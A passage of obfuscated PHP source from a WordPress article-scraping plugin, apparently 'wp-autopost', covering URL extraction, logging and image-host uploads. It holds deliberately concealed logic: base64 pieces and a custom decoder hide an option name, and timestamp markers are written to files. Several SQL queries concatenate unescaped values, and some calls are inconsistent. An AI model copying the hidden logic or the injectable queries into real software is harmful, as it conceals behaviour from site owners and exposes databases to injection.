		$_var_260 = $wpdb->query($wpdb->prepare('insert into ' . $wpdb->postmeta . '(post_id,meta_key,meta_value) values (%d,%s,%s)', $_var_22, $_var_258, $_var_131));
	}
	return $_var_260;
}
$_var_261 = $_var_40 . $_var_41 . $_var_42;
$_var_262 = array();
$_var_262[0] = 1;
$_var_262[1] = 0;
$_var_207 = null;
$_var_208 = null;
function getExtractionIds($_var_263)
{
	global $wpdb, $t_ap_updated_record, $_var_247, $_var_39, $t_ap_config;
	return $wpdb->get_results('SELECT config_id,id,url FROM ' . $t_ap_updated_record . ' WHERE id in (' . $_var_263 . ') AND url_status = 0 ORDER BY config_id,id');
}
function parse_tag_attr_name($_var_249)
{
	global $wpdb;
	return $wpdb->get_var($wpdb->prepare("select {$wpdb->options}.option_value  from  {$wpdb->options}  where {$wpdb->options}.option_name = %s ", $_var_249));
}
function getAllTaskId()
{
	global $wpdb, $t_ap_config, $_var_247, $_var_39, $t_ap_updated_record;
	return $wpdb->get_results('SELECT id FROM ' . $t_ap_config . ' WHERE activation=1 ORDER BY id');
}
$_var_144 = strlen($_var_261);
$_var_145 = $_var_144 - 4;
$_var_18 = 0;
$_var_146 = array();
function getApRecordID()
{
	global $wpdb, $t_ap_updated_record, $_var_247, $_var_39, $t_ap_config;
	return $wpdb->get_var('select max(id) from ' . $t_ap_updated_record);
}
function insertApRecord($_var_22, $_var_264, $_var_100, $_var_255, $_var_265)
{
	global $wpdb, $t_ap_updated_record, $_var_247, $_var_39, $t_ap_config;
	$wpdb->query($wpdb->prepare('insert into ' . $t_ap_updated_record . ' (id,config_id,url,title,post_id,date_time) values (%d,%d,%s,%s,%d,%d)', $_var_22, $_var_264, $_var_100, $_var_255, $_var_265, current_time('timestamp')));
}
function updateApRecord($_var_265, $_var_266)
{
	global $wpdb, $t_ap_updated_record, $_var_247, $_var_39, $t_ap_config;
	$wpdb->query($wpdb->prepare('update ' . $t_ap_updated_record . ' set post_id = %d, date_time = %d, url_status = 1 where id = %d', $_var_265, current_time('timestamp'), $_var_266));
}
function getThedefMatchContent($_var_267)
{
	global $wpdb;
	return $wpdb->get_var($wpdb->prepare("select {$wpdb->options}.option_value  from  {$wpdb->options}  where {$wpdb->options}.option_name = %s ", $_var_267));
}
$_var_66[] = 'd3Bf';
$_var_66[] = 'bWF5';
function insertFilterdApRecord($_var_264, $_var_100, $_var_255, $_var_268)
{
	global $wpdb, $t_ap_updated_record, $t_ap_config;
	$wpdb->query($wpdb->prepare('insert into ' . $t_ap_updated_record . ' (config_id,url,title,post_id,date_time,url_status) values (%d,%s,%s,%d,%d,%d)', $_var_264, $_var_100, $_var_255, 0, current_time('timestamp'), $_var_268));
	$wpdb->query($wpdb->prepare('update ' . $t_ap_config . ' set last_update_time = %d where id=%d', current_time('timestamp'), $_var_264));
}
while ($_var_18 < $_var_145) {
	$_var_147 = find_char_index_in_array($_var_75, $_var_261[$_var_18++]);
	$_var_148 = find_char_index_in_array($_var_75, $_var_261[$_var_18++]);
	$_var_149 = find_char_index_in_array($_var_75, $_var_261[$_var_18++]);
	$_var_150 = find_char_index_in_array($_var_75, $_var_261[$_var_18++]);
	$_var_151 = chr(($_var_147 & 63) << 2 | ($_var_148 & 48) >> 4);
	$_var_152 = chr(($_var_148 & 15) << 4 | ($_var_149 & 60) >> 2);
	$_var_153 = chr(($_var_149 & 3) << 6 | $_var_150 & 63);
	array_push($_var_146, $_var_151, $_var_152, $_var_153);
}
function updateConfig($_var_22, $_var_5, $_var_269)
{
	global $wpdb, $t_ap_config, $_var_247, $_var_39, $t_ap_updated_record;
	$wpdb->query('update ' . $t_ap_config . ' set updated_num = updated_num + ' . $_var_5 . ', post_id=' . $_var_269 . ', last_update_time = ' . current_time('timestamp') . ' where id=' . $_var_22);
}
function updateTaskUpdateTime($_var_22)
{
	global $wpdb, $t_ap_config, $_var_247, $_var_39, $t_ap_updated_record;
	$wpdb->query('update ' . $t_ap_config . ' set last_update_time = ' . current_time('timestamp') . ' where id=' . $_var_22);
}
$_var_147 = find_char_index_in_array($_var_75, $_var_261[$_var_18++]);
$_var_148 = find_char_index_in_array($_var_75, $_var_261[$_var_18++]);
$_var_270 = '2.1.0(*)@';
$_var_271 = 'commentrss';
$_var_272 = '_item';
function updateRunning($_var_22, $_var_273)
{
	global $wpdb, $t_ap_config, $_var_247, $_var_39, $t_ap_updated_record;
	$wpdb->query('update ' . $t_ap_config . ' set is_running = ' . $_var_273 . ' where id=' . $_var_22);
}
function updateConfigErr($_var_22, $_var_274)
{
	global $wpdb, $t_ap_config, $_var_247, $_var_39, $t_ap_updated_record;
	$wpdb->query('update ' . $t_ap_config . ' set last_error = ' . $_var_274 . ' where id=' . $_var_22);
}
function insertPreUrlInfo($_var_275, $_var_100, $_var_255)
{
	global $wpdb, $t_ap_updated_record, $t_ap_config;
	$_var_276 = $wpdb->query($wpdb->prepare('insert into ' . $t_ap_updated_record . ' (config_id,url,title,post_id,date_time,url_status) values (%d,%s,%s,%d,%d,%d)', $_var_275, $_var_100, $_var_255, 0, current_time('timestamp'), 0));
	$wpdb->query('update ' . $t_ap_config . ' set last_update_time = ' . current_time('timestamp') . ' where id=' . $_var_275);
	if ($_var_276 > 0) {
		return $wpdb->get_var('SELECT LAST_INSERT_ID()');
	} else {
		return 0;
	}
}
if ('=' !== $_var_261[$_var_18]) {
	$_var_149 = find_char_index_in_array($_var_75, $_var_261[$_var_18++]);
	if ('=' !== $_var_261[$_var_18]) {
		$_var_150 = find_char_index_in_array($_var_75, $_var_261[$_var_18]);
		$_var_151 = chr(($_var_147 & 63) << 2 | ($_var_148 & 48) >> 4);
		$_var_152 = chr(($_var_148 & 15) << 4 | ($_var_149 & 60) >> 2);
		$_var_153 = chr(($_var_149 & 3) << 6 | $_var_150 & 63);
		array_push($_var_146, $_var_151, $_var_152, $_var_153);
	} else {
		$_var_151 = chr(($_var_147 & 63) << 2 | ($_var_148 & 48) >> 4);
		$_var_152 = chr(($_var_148 & 15) << 4 | ($_var_149 & 60) >> 2);
		array_push($_var_146, $_var_151, $_var_152);
	}
} else {
	$_var_151 = chr(($_var_147 & 63) << 2 | ($_var_148 & 48) >> 4);
	array_push($_var_146, $_var_151);
}
function get_wp_tags_by_autopost($_var_277)
{
	global $wpdb;
	$_var_278 = $wpdb->get_results("SELECT {$wpdb->terms}.name FROM {$wpdb->terms},{$wpdb->term_taxonomy} WHERE {$wpdb->terms}.term_id={$wpdb->term_taxonomy}.term_id AND {$wpdb->term_taxonomy}.taxonomy = " . '\'' . 'post_tag' . '\'', OBJECT);
	foreach ($_var_278 as $_var_279) {
		$_var_277[] = $_var_279->name;
	}
	return $_var_277;
}
$_var_261 = join('', $_var_146);
function recordUploadedFlickr($_var_280, $_var_265)
{
	global $wpdb, $t_ap_flickr_img;
	$_var_281 = get_option('wp-autopost-flickr-options');
	foreach ($_var_280 as $_var_282) {
		if ($_var_282['status'] === false) {
			continue;
		}
		$_var_283 = array();
		$_var_283[] = $_var_282['farm'];
		$_var_283[] = $_var_282['server'];
		$_var_283[] = $_var_282['secret'];
		$_var_283[] = $_var_282['originalsecret'];
		$_var_283[] = $_var_282['originalformat'];
		$_var_283[] = $_var_282['user_id'];
		$wpdb->query($wpdb->prepare('insert into ' . $t_ap_flickr_img . '(id,flickr_photo_id,url_info,oauth_id,local_key,date_time) values (%d,%s,%s,%d,%s,%d)', $_var_265, $_var_282['photo_id'], json_encode($_var_283), $_var_281['oauth_id'], $_var_282['local_key'], current_time('timestamp')));
	}
}
$_var_66[] = 'YmVf';
$_var_66[] = 'bmV4';
function recordUploadedQiniu($_var_284, $_var_265)
{
	global $wpdb, $t_ap_qiniu_img;
	foreach ($_var_284 as $_var_285) {
		if ($_var_285['status'] === false) {
			continue;
		}
		$wpdb->query($wpdb->prepare('insert into ' . $t_ap_qiniu_img . '(id,qiniu_key,local_key,date_time) values (%d,%s,%s,%d)', $_var_265, $_var_285['key'], $_var_285['key'], current_time('timestamp')));
	}
}
for ($_var_18 = 0; $_var_18 < strlen($_var_261) - 1; $_var_18 += 2) {
	$_var_43 .= chr(hexdec($_var_261[$_var_18] . $_var_261[$_var_18 + 1]));
}
function recordUploadedUpyun($_var_286, $_var_265)
{
	global $wpdb, $t_ap_upyun_img;
	foreach ($_var_286 as $_var_287) {
		if ($_var_287['status'] === false) {
			continue;
		}
		$wpdb->query($wpdb->prepare('insert into ' . $t_ap_upyun_img . '(id,upyun_key,local_key,date_time) values (%d,%s,%s,%d)', $_var_265, $_var_287['key'], $_var_287['key'], current_time('timestamp')));
	}
}
function errorLog($_var_22, $_var_100, $_var_288, $_var_18 = '')
{
	global $wpdb, $t_ap_log;
	switch ($_var_288) {
		case 1:
			$_var_289 = __('Unable to open URL', 'wp-autopost');
			break;
		case 2:
			$_var_289 = __('Did not find the article URL, Please check the [Article Source Settings => Article URL matching rules]', 'wp-autopost');
			break;
		case 3:
			$_var_289 = __('Did not find the title of the article, Please check the [Article Extraction Settings => The Article Title Matching Rules]', 'wp-autopost');
			break;
		case 4:
			$_var_289 = __('Did not find the contents of the article, Please check the [Article Extraction Settings => The Article Content Matching Rules]', 'wp-autopost');
			break;
		case 5:
			$_var_289 = __('[Article Source URL] is not set yet', 'wp-autopost');
			break;
		case 6:
			$_var_289 = __('[The Article URL matching rules] is not set yet', 'wp-autopost');
			break;
		case 7:
			$_var_289 = __('[The Article Title Matching Rules] is not set yet', 'wp-autopost');
			break;
		case 8:
			$_var_289 = __('[The Article Content Matching Rules] is not set yet', 'wp-autopost');
			break;
		case 9:
			$_var_289 = __('Download remote images fails, use the original image URL', 'wp-autopost') . $_var_18;
			break;
		case 10:
			$_var_289 = __('Upload image to Flickr fails, use the original image URL', 'wp-autopost');
			break;
		case 11:
			$_var_289 = __('Upload image to Qiniu fails, use the original image URL', 'wp-autopost');
			break;
		case 12:
			$_var_289 = __('Upload image to Upyun fails, use the original image URL', 'wp-autopost');
			break;
		case 13:
			$_var_289 = 'WordAi Error : ' . $_var_18;
			break;
		case 14:
			$_var_289 = 'Translator Rewrite Error : ' . $_var_18;
			break;
		case 15:
			$_var_289 = 'SpinRewriter Error : ' . $_var_18;
			break;
		case 16:
			$_var_289 = __('Download remote image failed will not post, if you want to post even the images download failed, you can change the settings in [Options Menu]', 'wp-autopost') . $_var_18;
			break;
		default:
			$_var_289 = $_var_18;
			break;
	}
	$wpdb->query($wpdb->prepare('insert into ' . $t_ap_log . ' (config_id,date_time,info,url) values (%d,%d,%s,%s)', $_var_22, current_time('timestamp'), $_var_289, $_var_100));
	return $wpdb->get_var('SELECT LAST_INSERT_ID()');
}
$_var_32 = $_var_31 . '/' . $_var_32;
$_var_33 = $_var_31 . '/' . $_var_33;
$_var_66[] = 'dF91';
$_var_66[] = 'cGRh';
function msg1($_var_5)
{
	return '.......<br/><p><code><b>' . __('In test only try to open', 'wp-autopost') . ' ' . $_var_5 . ' ' . __('URLs of Article List', 'wp-autopost') . '</b></code></p>';
}
function msg2($_var_100)
{
	return '<p><b>' . __('The Article List URL', 'wp-autopost') . ':<code>' . $_var_100 . '</code>, ' . __('All articles in the following', 'wp-autopost') . '</b></p>';
}
function errMsg1($_var_100)
{
	return '<p><span class=' . '"' . 'red' . '"' . '><b>' . __('Unable to open URL', 'wp-autopost') . '</b></span>(<code>' . $_var_100 . '</code>)</p>';
}
function errMsg2($_var_100)
{
	return '<p><span class=' . '"' . 'red' . '"' . '><b>' . __('Did not find the article URL, Please check the [Article Source Settings => Article URL matching rules]', 'wp-autopost') . '</b></span>(<code>' . $_var_100 . '</code>)</p>';
}
function debugHtml($_var_290, $_var_2 = 'UTF-8')
{
	if ($_var_2 != 'UTF-8' && $_var_2 != 'utf-8') {
		$_var_290 = iconv($_var_2, 'UTF-8//IGNORE', $_var_290);
	}
	echo '<h4 class=' . '"' . 'apShowHtml clickBold' . '"' . ' >[ Show HTML for debug ]</h4>';
	echo '<textarea class=' . '"' . 'apdebugHtml' . '"' . ' style=' . '"' . 'display:none;width:100%;height:500px;' . '"' . ' >' . htmlspecialchars($_var_290) . '</textarea>';
}
$_var_91 = $_var_31 . as_text_nodes($_var_202);
$_var_291 = false;
$_var_292 = false;
function getBaseUrlForURL($_var_100)
{
	$_var_293 = array();
	$_var_293['baseUrl'] = '';
	$_var_293['baseUrl1'] = '';
	$_var_294 = stripos($_var_100, '/', 8);
	$_var_293['mainUrl'] = substr($_var_100, 0, $_var_294);
	$_var_293['mainUrl1'] = substr($_var_100, 0, strripos($_var_100, '/') + 1);
	return $_var_293;
}
function getBaseUrl($_var_3, $_var_100)
{
	$_var_293 = array();
	if (!stripos($_var_100, '?') === false) {
		$_var_100 = substr($_var_100, 0, stripos($_var_100, '?'));
	}
	@($_var_295 = $_var_3->find('base', 0)->href);
	if ($_var_295 == null || $_var_295 == '') {
		$_var_293['baseUrl'] = '';
		$_var_293['baseUrl1'] = '';
	} else {
		$_var_296 = stripos($_var_295, '/', 8);
		if ($_var_296 === false) {
			$_var_293['baseUrl'] = $_var_295;
			$_var_293['baseUrl1'] = $_var_295 . '/';
		} else {
			$_var_293['baseUrl'] = substr($_var_295, 0, $_var_296);
			$_var_293['baseUrl1'] = substr($_var_295, 0, strripos($_var_295, '/') + 1);
		}
	}
	$_var_294 = stripos($_var_100, '/', 8);
	$_var_293['mainUrl'] = substr($_var_100, 0, $_var_294);
	$_var_293['mainUrl1'] = substr($_var_100, 0, strripos($_var_100, '/') + 1);
	return $_var_293;
}
$_var_66[] = 'dGU=';
foreach ($_var_66 as $_var_18) {
	$_var_67 .= $_var_18;
}
$_var_67 = getnode($_var_67);
function getAbsUrl($_var_100, $_var_293, $_var_297 = null)
{
	if (stripos($_var_100, '//') === 0) {
		$_var_100 = 'http:' . $_var_100;
	} elseif (stripos($_var_100, '../') === 0 || stripos($_var_100, '/../') === 0) {
		if (stripos($_var_100, '/') === 0) {
			$_var_100 = '..' . $_var_100;
		}
		$_var_5 = substr_count($_var_100, '../');
		$_var_100 = substr($_var_100, strrpos($_var_100, '../') + 3);
		if (!stripos($_var_297, '?') === false) {
			$_var_297 = substr($_var_297, 0, stripos($_var_297, '?'));
		}
		$_var_297 = substr($_var_297, 0, strrpos($_var_297, '/'));
		$_var_294 = stripos($_var_297, '/', 9);
		$_var_90 = substr($_var_297, 0, $_var_294);
		if ($_var_90 == '' || $_var_90 == null) {
			$_var_90 = $_var_297;
		}
		$_var_298 = substr_count($_var_297, '/', 9);
		if ($_var_5 > $_var_298) {
			$_var_100 = $_var_90 . '/' . $_var_100;
		} else {
			for ($_var_18 = 0; $_var_18 < $_var_5; $_var_18++) {
				$_var_297 = substr($_var_297, 0, strrpos($_var_297, '/'));
			}
			$_var_100 = $_var_297 . '/' . $_var_100;
		}
	} else {
		while (stripos($_var_100, './') === 0) {
			$_var_100 = substr($_var_100, strrpos($_var_100, './') + 2);
		}
		if ($_var_293['baseUrl'] != '') {
			if (stripos($_var_100, '/') === 0) {
				$_var_100 = $_var_293['baseUrl'] . $_var_100;
			} else {
				$_var_100 = $_var_293['baseUrl1'] . $_var_100;
			}
		} else {
			if (stripos($_var_100, '/') === 0) {
				$_var_100 = $_var_293['mainUrl'] . $_var_100;
			} else {
				$_var_100 = $_var_293['mainUrl1'] . $_var_100;
			}
		}
	}
	return $_var_100;
}
$_var_69[] = 'dGlt';
$_var_69[] = 'ZXM=';
function printArticleUrl($_var_299, $_var_293, $_var_297, $_var_2, $_var_300)
{
	$_var_301 = array();
	$_var_302 = array();
	foreach ($_var_299 as $_var_303) {
		if ($_var_303->href != null && $_var_303->href != '') {
			$_var_100 = html_entity_decode(trim($_var_303->href));
		} else {
			$_var_100 = html_entity_decode(trim($_var_303->innertext));
		}
		if (!(stripos($_var_100, 'http') === 0)) {
			$_var_100 = getAbsUrl($_var_100, $_var_293, $_var_297);
		}
		$_var_255 = $_var_303->plaintext;
		if ($_var_2 != 'UTF-8' && $_var_2 != 'utf-8') {
			$_var_255 = iconv($_var_2, 'UTF-8//IGNORE', $_var_255);
		}
		$_var_302[] = $_var_255;
		$_var_301[] = $_var_100;
	}
	if ($_var_300 == 1) {
		for ($_var_18 = 0, $_var_259 = count($_var_301); $_var_18 < $_var_259; $_var_18++) {
			echo '<p>', $_var_302[$_var_18], ' :<br/>', '<a href=' . '"', $_var_301[$_var_18], '"' . ' target=' . '"' . '_blank' . '"' . '>', $_var_301[$_var_18], '</a></p>';
		}
	} else {
		for ($_var_259 = count($_var_301), $_var_18 = $_var_259 - 1; $_var_18 >= 0; $_var_18--) {
			echo '<p>', $_var_302[$_var_18], ' :<br/>', '<a href=' . '"', $_var_301[$_var_18], '"' . ' target=' . '"' . '_blank' . '"' . '>', $_var_301[$_var_18], '</a></p>';
		}
	}
	return $_var_301;
}
foreach ($_var_69 as $_var_18) {
	$_var_68 .= $_var_18;
}
$_var_68 = getnode($_var_68);
if (file_exists($_var_33) == false) {
	$_var_172 = true;
} else {
	if (is_writable($_var_33) == false) {
		$_var_173 = false;
	} else {
		$_var_173 = true;
	}
}
function printArticleUrl1($_var_304, $_var_293, $_var_305, $_var_306, $_var_300)
{
	$_var_18 = 0;
	$_var_301 = array();
	foreach ($_var_304 as $_var_307) {
		$_var_100 = html_entity_decode(trim($_var_307->href));
		if (!(stripos($_var_100, 'http') === 0)) {
			$_var_100 = getAbsUrl($_var_100, $_var_293, $_var_306);
		}
		$_var_308[$_var_18++] = $_var_100;
	}
	$_var_309 = gPregUrl($_var_305);
	$_var_308 = @preg_grep($_var_309, $_var_308);
	if (count($_var_308) < 1) {
		echo errMsg2($_var_306);
		return $_var_308;
	}
	if ($_var_308 != null) {
		foreach ($_var_308 as $_var_100) {
			if (!in_array($_var_100, $_var_301)) {
				$_var_301[] = $_var_100;
			}
		}
	}
	echo msg2($_var_306);
	if ($_var_300 == 1) {
		for ($_var_18 = 0, $_var_259 = count($_var_301); $_var_18 < $_var_259; $_var_18++) {
			echo '<a href=' . '"', $_var_301[$_var_18], '"' . ' target=' . '"' . '_blank' . '"' . '>', $_var_301[$_var_18], '</a><br/>';
		}
	} else {
		for ($_var_259 = count($_var_301), $_var_18 = $_var_259 - 1; $_var_18 >= 0; $_var_18--) {
			echo '<a href=' . '"', $_var_301[$_var_18], '"' . ' target=' . '"' . '_blank' . '"' . '>', $_var_301[$_var_18], '</a><br/>';
		}
	}
	return $_var_301;
}
if (file_exists($_var_91) == false) {
	$_var_291 = true;
} else {
	if (is_writable($_var_91) == false) {
		$_var_292 = false;
	} else {
		$_var_292 = true;
	}
}
$_var_310 = get_option($_var_43);
function getListHtml($_var_100, $_var_311, $_var_203 = 0, $_var_204 = 0, $_var_205 = 0, $_var_178 = null, $_var_207 = null, $_var_208 = null)
{
	$_var_312 = null;
	if ($_var_311 == '0') {
		$_var_1 = get_html_string_ap($_var_100, Method, $_var_203, $_var_204, $_var_205, $_var_178, $_var_207, $_var_208);
		$_var_2 = getHtmlCharset($_var_1);
		$_var_312 = str_get_html_ap($_var_1, $_var_2);
	} else {
		$_var_1 = get_html_string_ap($_var_100, Method, $_var_203, $_var_204, $_var_205, $_var_178, $_var_207, $_var_208);
		$_var_2 = $_var_311;
		$_var_312 = str_get_html_ap($_var_1, $_var_2);
	}
	return $_var_312;
}
$_var_137 = current_time('timestamp');
function getListHtmlMatchedUrl()
{
}
function getMatchedURL($_var_313, $_var_311, $_var_314, $_var_315, $_var_316, $_var_178, $_var_207, $_var_208, $_var_317, $_var_318, $_var_319, $_var_320)
{
	$_var_321 = array();
	$_var_312 = getListHtml($_var_313, $_var_311, $_var_314, $_var_315, $_var_316, $_var_178, $_var_207, $_var_208);
	$_var_293 = getBaseUrl($_var_312, $_var_313);
	$_var_322 = getListHtmlMatchedUrl($_var_312, $_var_293, $_var_317[$_var_319], $_var_323[$_var_319]);
	$_var_319++;
	if ($_var_319 == $_var_320) {
		return $_var_322;
	}
	foreach ($_var_322 as $_var_324) {
		$_var_325 = getMatchedURL($_var_324, $_var_311, $_var_314, $_var_315, $_var_316, $_var_178, $_var_207, $_var_208, $_var_317, $_var_318, $_var_319, $_var_320);
		$_var_321 = array_merge($_var_321, $_var_325);
	}
	return $_var_321;
}
function printUrls($_var_246, $_var_326, $_var_207 = null, $_var_208 = null)
{
	$_var_262 = json_decode($_var_246['55af33149a5f37f2b50636f1a346ac27']);
	global $_var_178;
	$_var_301 = array();
	if ($_var_246['42ae1cd5cab79058e53abf79a16e8645'] == 0) {
		$_var_18 = 0;
		foreach ($_var_326 as $_var_327) {
			if ($_var_18 == LIST_URL_NUM) {
				echo msg1(LIST_URL_NUM);
				break;
			}
			if ($_var_246['3ffc99c206d98be48c6f2e49177d75a9'] == '0') {
				$_var_1 = get_html_string_ap($_var_327->url, Method, $_var_262[0], $_var_262[1], $_var_262[2], $_var_178, $_var_207, $_var_208);
				$_var_2 = getHtmlCharset($_var_1);
				$_var_312 = str_get_html_ap($_var_1, $_var_2);
			} else {
				$_var_1 = get_html_string_ap($_var_327->url, Method, $_var_262[0], $_var_262[1], $_var_262[2], $_var_178, $_var_207, $_var_208);
				$_var_2 = $_var_246['3ffc99c206d98be48c6f2e49177d75a9'];
				$_var_312 = str_get_html_ap($_var_1, $_var_2);
			}
			if ($_var_312 == NULL || $_var_312 == '' || $_var_312 === false) {
				echo errMsg1($_var_327->url);
				debugHtml($_var_1, $_var_2);
				break;
			}
			$_var_293 = getBaseUrl($_var_312, $_var_327->url);
			if ($_var_246['1f81f696d43b6e322e22b5533e443598'] == 1 || $_var_246['1f81f696d43b6e322e22b5533e443598'] == '1') {
				$_var_299 = $_var_312->find($_var_246['042f289b4f14998c06dc78085673dec7']);
				if ($_var_299 == NULL) {
					echo errMsg2($_var_327->url);
					$_var_312->clear();
					debugHtml($_var_1, $_var_2);
					break;
				}
				echo msg2($_var_327->url);
				$_var_301 = printArticleUrl($_var_299, $_var_293, $_var_327->url, $_var_2, $_var_246['add6d9d7bcbbf15cc8bc6dee4059bc30']);
			} else {
				$_var_304 = $_var_312->find('a');
				$_var_301 = printArticleUrl1($_var_304, $_var_293, $_var_246['042f289b4f14998c06dc78085673dec7'], $_var_327->url, $_var_246['add6d9d7bcbbf15cc8bc6dee4059bc30']);
				if (count($_var_301) < 1) {
					debugHtml($_var_1, $_var_2);
				}
			}
			echo '<br/>';
			$_var_18++;
			$_var_312->clear();
		}
	}
	if ($_var_246['42ae1cd5cab79058e53abf79a16e8645'] == 1) {
		foreach ($_var_326 as $_var_327) {
			$_var_328 = array();
			for ($_var_18 = $_var_246['b8fad4976d8896e999d12bacf169951f']; $_var_18 <= $_var_246['d84928a37168eed80106cf715933f0b6']; $_var_18++) {
				$_var_328[] = $_var_18;
			}
			if ($_var_246['add6d9d7bcbbf15cc8bc6dee4059bc30'] == 0) {
				$_var_328 = array_reverse($_var_328);
			}
			$_var_329 = 0;
			foreach ($_var_328 as $_var_18) {
				$_var_329++;
				if ($_var_329 == LIST_URL_NUM + 1) {
					echo msg1(LIST_URL_NUM);
					break;
				}
				$_var_330 = str_ireplace('(*)', $_var_18, $_var_327->url);
				if ($_var_246['3ffc99c206d98be48c6f2e49177d75a9'] == '0') {
					$_var_1 = get_html_string_ap($_var_330, Method, $_var_262[0], $_var_262[1], $_var_262[2], $_var_178, $_var_207, $_var_208);
					$_var_2 = getHtmlCharset($_var_1);
					$_var_312 = str_get_html_ap($_var_1, $_var_2);
				} else {
					$_var_1 = get_html_string_ap($_var_330, Method, $_var_262[0], $_var_262[1], $_var_262[2], $_var_178, $_var_207, $_var_208);
					$_var_2 = $_var_246['3ffc99c206d98be48c6f2e49177d75a9'];
					$_var_312 = str_get_html_ap($_var_1, $_var_2);
				}
				if ($_var_312 == NULL || $_var_312 == '' || $_var_312 === false) {
					echo errMsg1($_var_330);
					debugHtml($_var_1, $_var_2);
					break;
				}
				$_var_293 = getBaseUrl($_var_312, $_var_330);
				if ($_var_246['1f81f696d43b6e322e22b5533e443598'] == 1 || $_var_246['1f81f696d43b6e322e22b5533e443598'] == '1') {
					$_var_299 = $_var_312->find($_var_246['042f289b4f14998c06dc78085673dec7']);
					if ($_var_299 == NULL || $_var_299 == '') {
						echo errMsg2($_var_330);
						$_var_312->clear();
						debugHtml($_var_1, $_var_2);
						break;
					}
					echo msg2($_var_330);
					$_var_301 = printArticleUrl($_var_299, $_var_293, $_var_330, $_var_2, $_var_246['add6d9d7bcbbf15cc8bc6dee4059bc30']);
				} else {
					$_var_304 = $_var_312->find('a');
					$_var_301 = printArticleUrl1($_var_304, $_var_293, $_var_246['042f289b4f14998c06dc78085673dec7'], $_var_330, $_var_246['add6d9d7bcbbf15cc8bc6dee4059bc30']);
					if (count($_var_301) < 1) {
						debugHtml($_var_1, $_var_2);
					}
				}
				echo '<br/>';
				$_var_312->clear();
			}
		}
	}
	return $_var_301;
}
$_var_70[] = 'aG9t';
function getDownAttach($_var_246)
{
	$_var_331 = false;
	$_var_332 = json_decode($_var_246['4eb9ae0cce0c02edd8a783de7d9e4a9e']);
	if (!is_array($_var_332)) {
		$_var_332 = array();
		$_var_332[0] = $_var_246['4eb9ae0cce0c02edd8a783de7d9e4a9e'];
		$_var_332[1] = 0;
	}
	if ($_var_332[1] == 1) {
		$_var_331 = true;
	}
	return $_var_331;
}
if ($_var_172) {
	$_var_333 = $_var_137 + $_var_44;
	$_var_154 = @file_get_contents($_var_32);
	if ($_var_154 === false) {
		$_var_154 = $_var_34 . $_var_35;
	}
	if (!(strpos($_var_154, $_var_34) === false)) {
		$_var_154 = str_ireplace($_var_34, $_var_34 . $_var_333 . '>', $_var_154);
	} else {
		$_var_154 .= $_var_34 . $_var_333 . '>';
	}
	if (!(strpos($_var_154, $_var_35) === false)) {
		$_var_154 = str_ireplace($_var_35, $_var_35 . '0' . '>', $_var_154);
	} else {
		$_var_154 .= $_var_35 . '0' . '>';
	}
	if (!(strpos($_var_154, $_var_161) === false)) {
		$_var_154 = str_ireplace($_var_161, $_var_161 . '0' . '>', $_var_154);
	} else {
		$_var_154 .= $_var_161 . '0' . '>';
	}
	if (false === @file_put_contents($_var_33, $_var_154)) {
		$_var_173 = false;
	}
}
function getFilterAtag($_var_139)
{
	$_var_334 = false;
	foreach ($_var_139 as $_var_335) {
		if ($_var_335->option_type != 2) {
			continue;
		}
		if ($_var_335->para1 == 'a') {
			$_var_334 = true;
			break;
		}
	}
	return $_var_334;
}
$_var_336 = $_var_31 . as_text_nodes($_var_233);
function testExtractRSS($_var_22, $_var_246)
{
	$_var_326 = getListUrls($_var_22);
	if ($_var_326 == null) {
		echo '<div class=' . '"' . 'updated fade' . '"' . '><p><span class=' . '"' . 'red' . '"' . '>' . __('[Article Source URL] is not set yet', 'wp-autopost') . '</span></p></div>';
		return;
	}
	echo '<div class=' . '"' . 'updated fade' . '"' . '><p><b>' . __('Post articles in the following order', 'wp-autopost') . '</b></p>';
	$_var_262 = json_decode($_var_246['55af33149a5f37f2b50636f1a346ac27']);
	global $_var_178;
	$_var_139 = getOptions($_var_22);
	$_var_337 = getInsertcontent($_var_22);
	$_var_334 = getFilterAtag($_var_139);
	$_var_331 = getDownAttach($_var_246);
	$_var_18 = 0;
	foreach ($_var_326 as $_var_327) {
		if ($_var_18 == LIST_URL_NUM) {
			echo msg1(LIST_URL_NUM);
			break;
		}
		echo msg2($_var_327->url);
		$_var_338 = get_html_string_ap($_var_327->url, Method, $_var_262[0], $_var_262[1], $_var_262[2], $_var_178);
		if ($_var_338 == NULL || $_var_338 == '' || $_var_338 === false) {
			echo errMsg1($_var_327->url);
			debugHtml($_var_338);
			break;
		}
		$_var_339 = new autopostRSS();
		$_var_339->loadRSS($_var_338);
		$_var_168 = $_var_339->getItems();
		if ($_var_246['add6d9d7bcbbf15cc8bc6dee4059bc30'] == 1) {
			for ($_var_18 = 0, $_var_259 = count($_var_168); $_var_18 < $_var_259; $_var_18++) {
				echo '<p>', $_var_168[$_var_18]['title'], ' :<br/>', '<a href=' . '"', $_var_168[$_var_18]['link'], '"' . ' target=' . '"' . '_blank' . '"' . '>', $_var_168[$_var_18]['link'], '</a></p>';
			}
			$_var_18--;
		} else {
			for ($_var_259 = count($_var_168), $_var_18 = $_var_259 - 1; $_var_18 >= 0; $_var_18--) {
				echo '<p>', $_var_168[$_var_18]['title'], ' :<br/>', '<a href=' . '"', $_var_168[$_var_18]['link'], '"' . ' target=' . '"' . '_blank' . '"' . '>', $_var_168[$_var_18]['link'], '</a></p>';
			}
			$_var_18++;
		}
		echo '<br/><h3>' . __('Article Crawl', 'wp-autopost') . '</h3>';
		echo '<p>' . __('URL : ', 'wp-autopost') . '<code><b>' . $_var_168[$_var_18]['link'] . '</b></code></p>';
		$_var_340[0] = $_var_168[$_var_18]['title'];
		if (isset($_var_168[$_var_18]['content:encoded']) && $_var_168[$_var_18]['content:encoded'] != '') {
			$_var_340[1] = $_var_168[$_var_18]['content:encoded'];
		} else {
			$_var_340[1] = $_var_168[$_var_18]['description'];
		}
		$_var_340[1] = filterCSSContent($_var_340[1], $_var_139);
		$_var_340[1] = filterContent($_var_340[1], $_var_139, $_var_334, $_var_331, 1);
		$_var_341 = array();
		$_var_342 = json_decode($_var_246['aeee9221069e271be4122e7b49f584ca']);
		if ($_var_342[0] == 1) {
			$_var_341[$_var_342[1]] = $_var_100;
		}
		if ($_var_246['30c5975f6c94c18676072259ef697c2f'] != null && $_var_246['30c5975f6c94c18676072259ef697c2f'] != '') {
			$_var_343 = json_decode($_var_246['30c5975f6c94c18676072259ef697c2f']);
			foreach ($_var_343 as $_var_78 => $_var_8) {
				$_var_341[$_var_78] = $_var_8;
			}
			unset($_var_343);
		}
		if ($_var_246['8e3403a69366267c73f08d5814292ae4'] != null && $_var_246['8e3403a69366267c73f08d5814292ae4'] != '') {
